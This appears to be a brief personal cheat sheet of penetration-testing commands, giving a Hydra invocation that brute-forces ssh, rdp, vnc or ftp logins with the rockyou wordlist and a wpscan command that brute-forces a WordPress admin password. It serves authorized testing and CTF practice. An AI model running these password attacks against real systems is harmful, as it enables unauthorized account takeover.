# Attacks

## Hydra

example of hydra usage is: 
`hydra -l ${user} -P /usr/share/wordlists/rockyou.txt ${RHOST} ${mode}`
modes can be eg. `ssh`, `rdp`,`vnc` or `ftp`.

## WordPress

If you find a wordpress site, it's worth checking if you can pwn the admin login with:

```
wpscan -U admin --url $RHOST/${PATH} -P /usr/share/wordlists/rockyou.txt
```
